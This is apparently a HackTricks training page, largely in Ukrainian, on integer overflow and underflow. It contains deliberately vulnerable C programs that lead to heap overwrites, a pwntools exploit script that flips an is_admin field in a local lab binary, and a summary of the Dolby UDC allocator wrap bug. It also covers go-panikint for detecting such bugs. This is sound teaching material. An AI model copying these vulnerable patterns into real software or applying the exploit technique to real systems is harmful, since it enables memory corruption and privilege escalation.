# Integer Overflow

{{#include ../banners/hacktricks-training.md}}

## –û—Å–Ω–æ–≤–Ω–∞ —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—è

–£ —Å–µ—Ä—Ü—ñ **integer overflow** –ª–µ–∂–∏—Ç—å –æ–±–º–µ–∂–µ–Ω–Ω—è, –Ω–∞–∫–ª–∞–¥–µ–Ω–µ **—Ä–æ–∑–º—ñ—Ä–æ–º** —Ç–∏–ø—ñ–≤ –¥–∞–Ω–∏—Ö —É –ø—Ä–æ–≥—Ä–∞–º—É–≤–∞–Ω–Ω—ñ —Ç–∞ **—ñ–Ω—Ç–µ—Ä–ø—Ä–µ—Ç–∞—Ü—ñ—î—é** –¥–∞–Ω–∏—Ö.

–ù–∞–ø—Ä–∏–∫–ª–∞–¥, **8-—Ä–æ–∑—Ä—è–¥–Ω–∏–π –±–µ–∑–∑–Ω–∞–∫–æ–≤–∏–π —Ü—ñ–ª–∏–π** –º–æ–∂–µ –ø—Ä–µ–¥—Å—Ç–∞–≤–ª—è—Ç–∏ –∑–Ω–∞—á–µ–Ω–Ω—è –≤—ñ–¥ **0 –¥–æ 255**. –Ø–∫—â–æ –≤–∏ —Å–ø—Ä–æ–±—É—î—Ç–µ –∑–±–µ—Ä–µ–≥—Ç–∏ –∑–Ω–∞—á–µ–Ω–Ω—è 256 –≤ 8-—Ä–æ–∑—Ä—è–¥–Ω–∏–π –±–µ–∑–∑–Ω–∞–∫–æ–≤–∏–π —Ü—ñ–ª–∏–π, –≤–æ–Ω–æ –æ–±–µ—Ä–Ω–µ—Ç—å—Å—è –¥–æ 0 —á–µ—Ä–µ–∑ –æ–±–º–µ–∂–µ–Ω–Ω—è —î–º–Ω–æ—Å—Ç—ñ. –ê–Ω–∞–ª–æ–≥—ñ—á–Ω–æ, –¥–ª—è **16-—Ä–æ–∑—Ä—è–¥–Ω–æ–≥–æ –±–µ–∑–∑–Ω–∞–∫–æ–≤–æ–≥–æ —Ü—ñ–ª–æ–≥–æ**, —è–∫–∏–π –º–æ–∂–µ –∑–±–µ—Ä—ñ–≥–∞—Ç–∏ –∑–Ω–∞—á–µ–Ω–Ω—è –≤—ñ–¥ **0 –¥–æ 65,535**, –¥–æ–¥–∞–≤–∞–Ω–Ω—è 1 –¥–æ 65,535 –∑–Ω–æ–≤—É –æ–±–µ—Ä–Ω–µ –∑–Ω–∞—á–µ–Ω–Ω—è –¥–æ 0.

–ö—Ä—ñ–º —Ç–æ–≥–æ, **8-—Ä–æ–∑—Ä—è–¥–Ω–∏–π –∑–Ω–∞–∫–æ–≤–∏–π —Ü—ñ–ª–∏–π** –º–æ–∂–µ –ø—Ä–µ–¥—Å—Ç–∞–≤–ª—è—Ç–∏ –∑–Ω–∞—á–µ–Ω–Ω—è –≤—ñ–¥ **-128 –¥–æ 127**. –¶–µ —Ç–æ–º—É, —â–æ –æ–¥–∏–Ω –±—ñ—Ç –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è –¥–ª—è –ø–æ–∑–Ω–∞—á–µ–Ω–Ω—è –∑–Ω–∞–∫—É (–ø–æ–∑–∏—Ç–∏–≤–Ω–æ–≥–æ —á–∏ –Ω–µ–≥–∞—Ç–∏–≤–Ω–æ–≥–æ), –∑–∞–ª–∏—à–∞—é—á–∏ 7 –±—ñ—Ç –¥–ª—è –ø—Ä–µ–¥—Å—Ç–∞–≤–ª–µ–Ω–Ω—è –≤–µ–ª–∏—á–∏–Ω–∏. –ù–∞–π–º–µ–Ω—à–µ –≤—ñ–¥'—î–º–Ω–µ —á–∏—Å–ª–æ –ø—Ä–µ–¥—Å—Ç–∞–≤–ª–µ–Ω–æ —è–∫ **-128** (–±—ñ–Ω–∞—Ä–Ω–æ `10000000`), –∞ –Ω–∞–π–±—ñ–ª—å—à–µ –¥–æ–¥–∞—Ç–Ω–µ —á–∏—Å–ª–æ ‚Äî **127** (–±—ñ–Ω–∞—Ä–Ω–æ `01111111`).

–ú–∞–∫—Å–∏–º–∞–ª—å–Ω—ñ –∑–Ω–∞—á–µ–Ω–Ω—è –¥–ª—è –ø–æ—à–∏—Ä–µ–Ω–∏—Ö —Ü—ñ–ª–∏—Ö —Ç–∏–ø—ñ–≤:
| –¢–∏–ø           | –†–æ–∑–º—ñ—Ä (–±—ñ—Ç) | –ú—ñ–Ω—ñ–º–∞–ª—å–Ω–µ –∑–Ω–∞—á–µ–Ω–Ω—è | –ú–∞–∫—Å–∏–º–∞–ª—å–Ω–µ –∑–Ω–∞—á–µ–Ω–Ω—è |
|----------------|-------------|--------------------|--------------------|
| int8_t         | 8           | -128               | 127                |
| uint8_t        | 8           | 0                  | 255                |
| int16_t        | 16          | -32,768            | 32,767             |
| uint16_t       | 16          | 0                  | 65,535            |
| int32_t        | 32          | -2,147,483,648 | 2,147,483,647      |
| uint32_t       | 32          | 0                  | 4,294,967,295      |
| int64_t        | 64          | -9,223,372,036,854,775,808 | 9,223,372,036,854,775,807 |
| uint64_t       | 64          | 0                  | 18,446,744,073,709,551,615 |

short –µ–∫–≤—ñ–≤–∞–ª–µ–Ω—Ç–Ω–∏–π `int16_t`, int –µ–∫–≤—ñ–≤–∞–ª–µ–Ω—Ç–Ω–∏–π `int32_t`, –∞ long –µ–∫–≤—ñ–≤–∞–ª–µ–Ω—Ç–Ω–∏–π `int64_t` —É 64-–±—ñ—Ç–Ω–∏—Ö —Å–∏—Å—Ç–µ–º–∞—Ö.

### –ú–∞–∫—Å–∏–º–∞–ª—å–Ω—ñ –∑–Ω–∞—á–µ–Ω–Ω—è

–î–ª—è –ø–æ—Ç–µ–Ω—Ü—ñ–π–Ω–∏—Ö **web vulnerabilities** –¥—É–∂–µ –∫–æ—Ä–∏—Å–Ω–æ –∑–Ω–∞—Ç–∏ –º–∞–∫—Å–∏–º–∞–ª—å–Ω—ñ –ø—ñ–¥—Ç—Ä–∏–º—É–≤–∞–Ω—ñ –∑–Ω–∞—á–µ–Ω–Ω—è:

{{#tabs}}
{{#tab name="Rust"}}
```rust
fn main() {

let mut quantity = 2147483647;

let (mul_result, _) = i32::overflowing_mul(32767, quantity);
let (add_result, _) = i32::overflowing_add(1, quantity);

println!("{}", mul_result);
println!("{}", add_result);
}
```
{{#endtab}}

{{#tab name="C"}}
```c
#include <stdio.h>
#include <limits.h>

int main() {
int a = INT_MAX;
int b = 0;
int c = 0;

b = a * 100;
c = a + 1;

printf("%d\n", INT_MAX);
printf("%d\n", b);
printf("%d\n", c);
return 0;
}
```
{{#endtab}}
{{#endtabs}}

## –ü—Ä–∏–∫–ª–∞–¥–∏

### Pure overflow

–ù–∞–¥—Ä—É–∫–æ–≤–∞–Ω–∏–π —Ä–µ–∑—É–ª—å—Ç–∞—Ç –±—É–¥–µ 0, –æ—Å–∫—ñ–ª—å–∫–∏ –º–∏ overflowed char:
```c
#include <stdio.h>

int main() {
unsigned char max = 255; // 8-bit unsigned integer
unsigned char result = max + 1;
printf("Result: %d\n", result); // Expected to overflow
return 0;
}
```
### Signed to Unsigned Conversion

–†–æ–∑–≥–ª—è–Ω–µ–º–æ —Å–∏—Ç—É–∞—Ü—ñ—é, –∫–æ–ª–∏ –∑—ñ –≤–≤–æ–¥—É –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ –∑—á–∏—Ç—É—î—Ç—å—Å—è –∑–Ω–∞–∫–æ–≤–µ —Ü—ñ–ª–µ —á–∏—Å–ª–æ, —è–∫–µ –ø–æ—Ç—ñ–º –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è –≤ –∫–æ–Ω—Ç–µ–∫—Å—Ç—ñ, —â–æ —Ç—Ä–∞–∫—Ç—É—î –π–æ–≥–æ —è–∫ –±–µ–∑–∑–Ω–∞–∫–æ–≤–µ —Ü—ñ–ª–µ —á–∏—Å–ª–æ, –±–µ–∑ –Ω–∞–ª–µ–∂–Ω–æ—ó –≤–∞–ª—ñ–¥–∞—Ü—ñ—ó:
```c
#include <stdio.h>

int main() {
int userInput; // Signed integer
printf("Enter a number: ");
scanf("%d", &userInput);

// Treating the signed input as unsigned without validation
unsigned int processedInput = (unsigned int)userInput;

// A condition that might not work as intended if userInput is negative
if (processedInput > 1000) {
printf("Processed Input is large: %u\n", processedInput);
} else {
printf("Processed Input is within range: %u\n", processedInput);
}

return 0;
}
```
–£ —Ü—å–æ–º—É –ø—Ä–∏–∫–ª–∞–¥—ñ, —è–∫—â–æ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á –≤–≤–µ–¥–µ –≤—ñ–¥'—î–º–Ω–µ —á–∏—Å–ª–æ, –≤–æ–Ω–æ –±—É–¥–µ —ñ–Ω—Ç–µ—Ä–ø—Ä–µ—Ç–æ–≤–∞–Ω–µ —è–∫ –≤–µ–ª–∏–∫–µ –±–µ–∑–∑–Ω–∞–∫–æ–≤–µ —Ü—ñ–ª–µ —á–∏—Å–ª–æ —á–µ—Ä–µ–∑ —Å–ø–æ—Å—ñ–± —ñ–Ω—Ç–µ—Ä–ø—Ä–µ—Ç–∞—Ü—ñ—ó –¥–≤—ñ–π–∫–æ–≤–∏—Ö –∑–Ω–∞—á–µ–Ω—å, —â–æ –ø–æ—Ç–µ–Ω—Ü—ñ–π–Ω–æ –ø—Ä–∏–∑–≤–µ–¥–µ –¥–æ –Ω–µ–ø–µ—Ä–µ–¥–±–∞—á—É–≤–∞–Ω–æ—ó –ø–æ–≤–µ–¥—ñ–Ω–∫–∏.

### macOS Overflow Example
```c
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>

/*
* Realistic integer-overflow ‚Üí undersized allocation ‚Üí heap overflow ‚Üí flag
* Works on macOS arm64 (no ret2win required; avoids PAC/CFI).
*/

__attribute__((noinline))
void win(void) {
puts("üéâ EXPLOITATION SUCCESSFUL üéâ");
puts("FLAG{integer_overflow_to_heap_overflow_on_macos_arm64}");
exit(0);
}

struct session {
int is_admin;           // Target to flip from 0 ‚Üí 1
char note[64];
};

static size_t read_stdin(void *dst, size_t want) {
// Read in bounded chunks to avoid EINVAL on large nbyte (macOS PTY/TTY)
const size_t MAX_CHUNK = 1 << 20; // 1 MiB per read (any sane cap is fine)
size_t got = 0;

printf("Requested bytes: %zu\n", want);

while (got < want) {
size_t remain = want - got;
size_t chunk  = remain > MAX_CHUNK ? MAX_CHUNK : remain;

ssize_t n = read(STDIN_FILENO, (char*)dst + got, chunk);
if (n > 0) {
got += (size_t)n;
continue;
}
if (n == 0) {
// EOF ‚Äì stop; partial reads are fine for our exploit
break;
}
// n < 0: real error (likely EINVAL when chunk too big on some FDs)
perror("read");
break;
}
return got;
}


int main(void) {
setvbuf(stdout, NULL, _IONBF, 0);
puts("=== Bundle Importer (training) ===");

// 1) Read attacker-controlled parameters (use large values)
size_t count = 0, elem_size = 0;
printf("Entry count: ");
if (scanf("%zu", &count) != 1) return 1;
printf("Entry size: ");
if (scanf("%zu", &elem_size) != 1) return 1;

// 2) Compute total bytes with a 32-bit truncation bug (vulnerability)
//    NOTE: 'product32' is 32-bit ‚Üí wraps; then we add a tiny header.
uint32_t product32 = (uint32_t)(count * elem_size);//<-- Integer overflow because the product is converted to 32-bit.
/* So if you send "4294967296" (0x1_00000000 as count) and 1 as element --> 0x1_00000000 * 1 = 0 in 32bits
Then, product32 = 0
*/
uint32_t alloc32   = product32 + 32; // alloc32 = 0 + 32 = 32
printf("[dbg] 32-bit alloc = %u bytes (wrapped)\n", alloc32);

// 3) Allocate a single arena and lay out [buffer][slack][session]
//    This makes adjacency deterministic (no reliance on system malloc order).
const size_t SLACK = 512;
size_t arena_sz = (size_t)alloc32 + SLACK; // 32 + 512 = 544 (0x220)
unsigned char *arena = (unsigned char*)malloc(arena_sz);
if (!arena) { perror("malloc"); return 1; }
memset(arena, 0, arena_sz);

unsigned char *buf  = arena;  // In this buffer the attacker will copy data
struct session *sess = (struct session*)(arena + (size_t)alloc32 + 16); // The session is stored right after the buffer + alloc32 (32) + 16 = buffer + 48
sess->is_admin = 0;
strncpy(sess->note, "regular user", sizeof(sess->note)-1);

printf("[dbg] arena=%p buf=%p alloc32=%u sess=%p offset_to_sess=%zu\n",
(void*)arena, (void*)buf, alloc32, (void*)sess,
((size_t)alloc32 + 16)); // This just prints the address of the pointers to see that the distance between "buf" and "sess" is 48 (32 + 16).

// 4) Copy uses native size_t product (no truncation) ‚Üí It generates an overflow
size_t to_copy = count * elem_size;                   // <-- Large size_t
printf("[dbg] requested copy (size_t) = %zu\n", to_copy);

puts(">> Send bundle payload on stdin (EOF to finish)...");
size_t got = read_stdin(buf, to_copy); // <-- Heap overflow vulnerability that can bue abused to overwrite sess->is_admin to 1
printf("[dbg] actually read = %zu bytes\n", got);

// 5) Privileged action gated by a field next to the overflow target
if (sess->is_admin) {
puts("[dbg] admin privileges detected");
win();
} else {
puts("[dbg] normal user");
}
return 0;
}
```
–°–∫–æ–º–ø—ñ–ª—é–π—Ç–µ —Ü–µ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é:
```bash
clang -O0 -Wall -Wextra -std=c11 -D_FORTIFY_SOURCE=0 \
-o int_ovf_heap_priv int_ovf_heap_priv.c
```
#### Exploit
```python
# exploit.py
from pwn import *

# Keep logs readable; switch to "debug" if you want full I/O traces
context.log_level = "info"

EXE = "./int_ovf_heap_priv"

def main():
# IMPORTANT: use plain pipes, not PTY
io = process([EXE])  # stdin=PIPE, stdout=PIPE by default

# 1) Drive the prompts
io.sendlineafter(b"Entry count: ", b"4294967296")  # 2^32 -> (uint32_t)0
io.sendlineafter(b"Entry size: ",  b"1")           # alloc32 = 32, offset_to_sess = 48

# 2) Wait until it‚Äôs actually reading the payload
io.recvuntil(b">> Send bundle payload on stdin (EOF to finish)...")

# 3) Overflow 48 bytes, then flip is_admin to 1 (little-endian)
payload = b"A" * 48 + p32(1)

# 4) Send payload, THEN send EOF via half-close on the pipe
io.send(payload)
io.shutdown("send")   # <-- this delivers EOF when using pipes, it's needed to stop the read loop from the binary

# 5) Read the rest (should print admin + FLAG)
print(io.recvall(timeout=5).decode(errors="ignore"))

if __name__ == "__main__":
main()
```
### macOS Underflow –ü—Ä–∏–∫–ª–∞–¥
```c
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>

/*
* Integer underflow -> undersized allocation + oversized copy -> heap overwrite
* Works on macOS arm64. Data-oriented exploit: flip sess->is_admin.
*/

__attribute__((noinline))
void win(void) {
puts("üéâ EXPLOITATION SUCCESSFUL üéâ");
puts("FLAG{integer_underflow_heap_overwrite_on_macos_arm64}");
exit(0);
}

struct session {
int  is_admin;      // flip 0 -> 1
char note[64];
};

static size_t read_stdin(void *dst, size_t want) {
// Read in bounded chunks so huge 'want' doesn't break on PTY/TTY.
const size_t MAX_CHUNK = 1 << 20; // 1 MiB
size_t got = 0;
printf("[dbg] Requested bytes: %zu\n", want);
while (got < want) {
size_t remain = want - got;
size_t chunk  = remain > MAX_CHUNK ? MAX_CHUNK : remain;
ssize_t n = read(STDIN_FILENO, (char*)dst + got, chunk);
if (n > 0) { got += (size_t)n; continue; }
if (n == 0) break;    // EOF: partial read is fine
perror("read"); break;
}
return got;
}

int main(void) {
setvbuf(stdout, NULL, _IONBF, 0);
puts("=== Packet Importer (UNDERFLOW training) ===");

size_t total_len = 0;
printf("Total packet length: ");
if (scanf("%zu", &total_len) != 1) return 1; // Suppose it's "8"

const size_t HEADER = 16;

// **BUG**: size_t underflow if total_len < HEADER
size_t payload_len = total_len - HEADER;   // <-- UNDERFLOW HERE if total_len < HEADER --> Huge number as it's unsigned
// If total_len = 8, payload_len = 8 - 16 = -8 = 0xfffffffffffffff8 = 18446744073709551608 (on 64bits - huge number)
printf("[dbg] total_len=%zu, HEADER=%zu, payload_len=%zu\n",
total_len, HEADER, payload_len);

// Build a deterministic arena: [buf of total_len][16 gap][session][slack]
const size_t SLACK = 256;
size_t arena_sz = total_len + 16 + sizeof(struct session) + SLACK; // 8 + 16 + 72 + 256 = 352 (0x160)
unsigned char *arena = (unsigned char*)malloc(arena_sz);
if (!arena) { perror("malloc"); return 1; }
memset(arena, 0, arena_sz);

unsigned char *buf  = arena;
struct session *sess = (struct session*)(arena + total_len + 16);
// The offset between buf and sess is total_len + 16 = 8 + 16 = 24 (0x18)
sess->is_admin = 0;
strncpy(sess->note, "regular user", sizeof(sess->note)-1);

printf("[dbg] arena=%p buf=%p total_len=%zu sess=%p offset_to_sess=%zu\n",
(void*)arena, (void*)buf, total_len, (void*)sess, total_len + 16);

puts(">> Send payload bytes (EOF to finish)...");
size_t got = read_stdin(buf, payload_len);
// The offset between buf and sess is 24 and the payload_len is huge so we can overwrite sess->is_admin to set it as 1
printf("[dbg] actually read = %zu bytes\n", got);

if (sess->is_admin) {
puts("[dbg] admin privileges detected");
win();
} else {
puts("[dbg] normal user");
}
return 0;
}
```
–°–∫–æ–º–ø—ñ–ª—é–π—Ç–µ —Ü–µ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é:
```bash
clang -O0 -Wall -Wextra -std=c11 -D_FORTIFY_SOURCE=0 \
-o int_underflow_heap int_underflow_heap.c
```
### Allocator alignment rounding wrap ‚Üí undersized chunk ‚Üí heap overflow (Dolby UDC case)

–î–µ—è–∫—ñ custom allocators –æ–∫—Ä—É–≥–ª—é—é—Ç—å allocations –≤–≥–æ—Ä—É –¥–æ alignment –±–µ–∑ –ø–æ–≤—Ç–æ—Ä–Ω–æ—ó –ø–µ—Ä–µ–≤—ñ—Ä–∫–∏ –Ω–∞ overflow. –£ Dolby Unified Decoder (Pixel 9, CVE-2025-54957) –∫–µ—Ä–æ–≤–∞–Ω–∏–π –∞—Ç–∞–∫—É—é—á–∏–º `emdf_payload_size` (–¥–µ–∫–æ–¥–æ–≤–∞–Ω–∏–π –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é –Ω–µ–æ–±–º–µ–∂–µ–Ω–æ–≥–æ —Ü–∏–∫–ª—É `variable_bits(8)`) –ø–µ—Ä–µ–¥–∞—î—Ç—å—Å—è –≤ `ddp_udc_int_evo_malloc`:
```c
size_t total_size = alloc_size + extra;
if (alloc_size + extra < alloc_size) return 0; // initial wrap guard
if (total_size % 8)
total_size += (8 - total_size) % total_size; // vulnerable rounding
if (total_size > heap->remaining) return 0;
```
–î–ª—è 64-–±—ñ—Ç–Ω–∏—Ö –∑–Ω–∞—á–µ–Ω—å –ø–æ–±–ª–∏–∑—É `0xFFFFFFFFFFFFFFF9`, `(8 - total_size) % total_size` –ø–µ—Ä–µ–ø–æ–≤–Ω—é—î –¥–æ–¥–∞–≤–∞–Ω–Ω—è —ñ –ø—Ä–∏–∑–≤–æ–¥–∏—Ç—å –¥–æ **–¥—É–∂–µ –º–∞–ª–æ–≥–æ `total_size`**, —Ö–æ—á–∞ –ª–æ–≥—ñ—á–Ω–∏–π `alloc_size` –∑–∞–ª–∏—à–∞—î—Ç—å—Å—è –≤–µ–ª–∏—á–µ–∑–Ω–∏–º. –í–∏–∫–ª–∏–∫–∞—á –ø—ñ–∑–Ω—ñ—à–µ –∑–∞–ø–∏—Å—É—î `payload_length` –±–∞–π—Ç —É –ø–æ–≤–µ—Ä–Ω–µ–Ω–∏–π chunk:
```c
buffer = ddp_udc_int_evo_malloc(evo_heap, payload_length, extra);
for (size_t i = 0; i < payload_length; i++) { // bounds use logical size
buffer[i] = next_byte_from_emdf();       // writes past tiny chunk
}
```
–ß–æ–º—É exploitation –Ω–∞–¥—ñ–π–Ω–∞ –≤ —Ü—å–æ–º—É pattern:
- **Overflow length control:** –ë–∞–π—Ç–∏ –±–µ—Ä—É—Ç—å—Å—è –∑ reader-–∞, –æ–±–º–µ–∂–µ–Ω–æ–≥–æ —ñ–Ω—à–∏–º attacker-chosen length (`emdf_container_length`), —Ç–æ–∂ –∑–∞–ø–∏—Å –∑—É–ø–∏–Ω—è—î—Ç—å—Å—è –ø—ñ—Å–ª—è N –±–∞–π—Ç—ñ–≤ –∑–∞–º—ñ—Å—Ç—å —Ä–æ–∑–ø–∏–ª–µ–Ω–Ω—è `payload_length`.
- **Overflow data control:** –ë–∞–π—Ç–∏, –∑–∞–ø–∏—Å–∞–Ω—ñ –ø–æ–∑–∞ —á–∞–Ω–∫–æ–º, –ø–æ–≤–Ω—ñ—Å—Ç—é –Ω–∞–¥–∞—é—Ç—å—Å—è –∞—Ç–∞–∫—É—é—á–∏–º –∑ EMDF payload.
- **Heap determinism:** –ê–ª–ª–æ–∫–∞—Ç–æ—Ä ‚Äî per-frame bump-pointer slab –±–µ–∑ frees, —Ç–æ–º—É —Å—É–º—ñ–∂–Ω—ñ—Å—Ç—å –ø–æ—à–∫–æ–¥–∂–µ–Ω–∏—Ö –æ–±‚Äô—î–∫—Ç—ñ–≤ –ø–µ—Ä–µ–¥–±–∞—á—É–≤–∞–Ω–∞.

## –Ü–Ω—à—ñ –ø—Ä–∏–∫–ª–∞–¥–∏

- [https://guyinatuxedo.github.io/35-integer_exploitation/int_overflow_post/index.html](https://guyinatuxedo.github.io/35-integer_exploitation/int_overflow_post/index.html)
- –î–ª—è –∑–±–µ—Ä–µ–∂–µ–Ω–Ω—è —Ä–æ–∑–º—ñ—Ä—É –ø–∞—Ä–æ–ª—è –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è –ª–∏—à–µ 1B, —Ç–æ–∂ –º–æ–∂–Ω–∞ –π–æ–≥–æ –ø–µ—Ä–µ–ø–æ–≤–Ω–∏—Ç–∏ —ñ –∑–º—É—Å–∏—Ç–∏ –¥—É–º–∞—Ç–∏, —â–æ –≤—ñ–Ω –º–∞—î –¥–æ–≤–∂–∏–Ω—É 4, —Ö–æ—á–∞ –Ω–∞—Å–ø—Ä–∞–≤–¥—ñ –≤–æ–Ω–∞ 260 ‚Äî —Ü–µ –¥–æ–∑–≤–æ–ª—è—î –æ–±—ñ–π—Ç–∏ –ø–µ—Ä–µ–≤—ñ—Ä–∫—É –¥–æ–≤–∂–∏–Ω–∏.
- [https://guyinatuxedo.github.io/35-integer_exploitation/puzzle/index.html](https://guyinatuxedo.github.io/35-integer_exploitation/puzzle/index.html)

- –î–∞–Ω–æ –∫—ñ–ª—å–∫–∞ —á–∏—Å–µ–ª ‚Äî –∑–Ω–∞–π—Ç–∏ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é z3 –Ω–æ–≤–µ —á–∏—Å–ª–æ, —è–∫–µ –ø—Ä–∏ –º–Ω–æ–∂–µ–Ω–Ω—ñ –Ω–∞ –ø–µ—Ä—à–µ –¥–∞—Å—Ç—å –¥—Ä—É–≥–µ:

```
(((argv[1] * 0x1064deadbeef4601) & 0xffffffffffffffff) == 0xD1038D2E07B42569)
```

- [https://8ksec.io/arm64-reversing-and-exploitation-part-8-exploiting-an-integer-overflow-vulnerability/](https://8ksec.io/arm64-reversing-and-exploitation-part-8-exploiting-an-integer-overflow-vulnerability/)
- –î–ª—è –∑–±–µ—Ä–µ–∂–µ–Ω–Ω—è —Ä–æ–∑–º—ñ—Ä—É –ø–∞—Ä–æ–ª—è –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è –ª–∏—à–µ 1B, —Ç–æ–º—É –π–æ–≥–æ –º–æ–∂–Ω–∞ –ø–µ—Ä–µ–ø–æ–≤–Ω–∏—Ç–∏ —ñ –∑–º—É—Å–∏—Ç–∏ –¥—É–º–∞—Ç–∏, —â–æ –¥–æ–≤–∂–∏–Ω–∞ 4, —Ö–æ—á–∞ –Ω–∞—Å–ø—Ä–∞–≤–¥—ñ 260 ‚Äî —Ü–µ –¥–æ–∑–≤–æ–ª—è—î –æ–±—ñ–π—Ç–∏ –ø–µ—Ä–µ–≤—ñ—Ä–∫—É –¥–æ–≤–∂–∏–Ω–∏ —ñ –ø–µ—Ä–µ–∑–∞–ø–∏—Å–∞—Ç–∏ –Ω–∞ —Å—Ç–µ–∫—É –Ω–∞—Å—Ç—É–ø–Ω—É –ª–æ–∫–∞–ª—å–Ω—É –∑–º—ñ–Ω–Ω—É, –æ–±—Ö–æ–¥—è—á–∏ –æ–±–∏–¥–≤—ñ –∑–∞—Ö–∏—Å—Ç–∏.

## Go integer overflow detection with go-panikint

Go wraps integers silently. [go-panikint](https://github.com/trailofbits/go-panikint) ‚Äî —Ü–µ —Ñ–æ—Ä–∫–æ–≤–∞–Ω–∏–π Go toolchain, —è–∫–∏–π —ñ–Ω–∂–µ–∫—Ç–∏—Ç—å SSA overflow checks —Ç–∞–∫, —â–æ wrapped arithmetic –æ–¥—Ä–∞–∑—É –≤–∏–∫–ª–∏–∫–∞—î `runtime.panicoverflow()` (panic + stack trace).

**–ù–∞–≤—ñ—â–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏**

- –†–æ–±–∏—Ç—å overflow/truncation –¥–æ—Å—è–∂–Ω–∏–º–∏ –ø—ñ–¥ —á–∞—Å fuzzing/CI, –±–æ —Ç–µ–ø–µ—Ä wrap-–æ–ø–µ—Ä–∞—Ü—ñ—ó –ø–∞–¥–∞—é—Ç—å.
- –ö–æ—Ä–∏—Å–Ω–æ –ø–æ—Ä—É—á —ñ–∑ user-controlled pagination, offsets, quotas, size calculations –∞–±–æ access-control math (–Ω–∞–ø—Ä–∏–∫–ª–∞–¥, `end := offset + limit` –Ω–∞ `uint64`, —è–∫–∏–π –º–æ–∂–µ wrap-–Ω—É—Ç–∏ –ø—Ä–∏ –º–∞–ª–∏—Ö –∑–Ω–∞—á–µ–Ω–Ω—è—Ö).

**Build & use**
```bash
git clone https://github.com/trailofbits/go-panikint
cd go-panikint/src && ./make.bash
export GOROOT=/path/to/go-panikint
./bin/go test -fuzz=FuzzOverflowHarness
```
–ó–∞–ø—É—Å—Ç—ñ—Ç—å —Ü–µ–π —Ñ–æ—Ä–∫–æ–≤–∞–Ω–∏–π –±—ñ–Ω–∞—Ä–Ω–∏–π —Ñ–∞–π–ª `go` –¥–ª—è —Ç–µ—Å—Ç—ñ–≤/fuzzing, —â–æ–± –ø—Ä–æ—è–≤–∏—Ç–∏ –ø–µ—Ä–µ–ø–æ–≤–Ω–µ–Ω–Ω—è —è–∫ panics.

**–ö–æ–Ω—Ç—Ä–æ–ª—å —à—É–º—É**

- –ü–µ—Ä–µ–≤—ñ—Ä–∫–∏ —É—Å—ñ—á–µ–Ω–Ω—è (casts –¥–æ –º–µ–Ω—à–∏—Ö ints) –º–æ–∂—É—Ç—å –±—É—Ç–∏ —à—É–º–Ω–∏–º–∏.
- –ü—ñ–¥–∞–≤–ª—è–π—Ç–µ –Ω–∞–≤–º–∏—Å–Ω–∏–π wrap-around —á–µ—Ä–µ–∑ —Ñ—ñ–ª—å—Ç—Ä–∏ source-path –∞–±–æ inline –∫–æ–º–µ–Ω—Ç–∞—Ä—ñ `// overflow_false_positive` / `// truncation_false_positive`.

**–†–µ–∞–ª—å–Ω–∏–π –ø—Ä–∏–∫–ª–∞–¥**

go-panikint –≤–∏—è–≤–∏–≤ –ø–µ—Ä–µ–ø–æ–≤–Ω–µ–Ω–Ω—è –ø–∞–≥—ñ–Ω–∞—Ü—ñ—ó Cosmos SDK –¥–ª—è `uint64`: `end := pageRequest.Offset + pageRequest.Limit` –≤–∏–∫–æ–Ω–∞–ª–æ wrap-around –∑–∞ `MaxUint64`, —á–µ—Ä–µ–∑ —â–æ –ø–æ–≤–µ—Ä—Ç–∞–ª–∏—Å—è –ø–æ—Ä–æ–∂–Ω—ñ —Ä–µ–∑—É–ª—å—Ç–∞—Ç–∏. –Ü–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç—É–≤–∞–Ω–Ω—è –ø–µ—Ä–µ—Ç–≤–æ—Ä–∏–ª–æ —Ç–∏—Ö–µ wrap-around –Ω–∞ panic, —è–∫–∏–π fuzzers –∑–º–æ–≥–ª–∏ –º—ñ–Ω—ñ–º—ñ–∑—É–≤–∞—Ç–∏.

## ARM64

–¶–µ **–Ω–µ –∑–º—ñ–Ω—é—î—Ç—å—Å—è –Ω–∞ ARM64**, —è–∫ –≤–∏–¥–Ω–æ –≤ [**—Ü—å–æ–º—É –±–ª–æ–≥-–ø–æ—Å—Ç—ñ**](https://8ksec.io/arm64-reversing-and-exploitation-part-8-exploiting-an-integer-overflow-vulnerability/).

## –ü–æ—Å–∏–ª–∞–Ω–Ω—è

- [–í–∏—è–≤–ª—è–π—Ç–µ –ø—Ä–∏—Ö–æ–≤–∞–Ω—ñ –∞—Ä–∏—Ñ–º–µ—Ç–∏—á–Ω—ñ –±–∞–≥–∏ Go –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é go-panikint](https://blog.trailofbits.com/2025/12/31/detect-gos-silent-arithmetic-bugs-with-go-panikint/)
- [go-panikint (—Ñ–æ—Ä–∫ –∫–æ–º–ø—ñ–ª—è—Ç–æ—Ä–∞)](https://github.com/trailofbits/go-panikint)
- [Pixel 0-click ‚Äì CVE-2025-54957 allocator wrap ‚Üí heap overflow](https://projectzero.google/2026/01/pixel-0-click-part-1.html)

{{#include ../banners/hacktricks-training.md}}
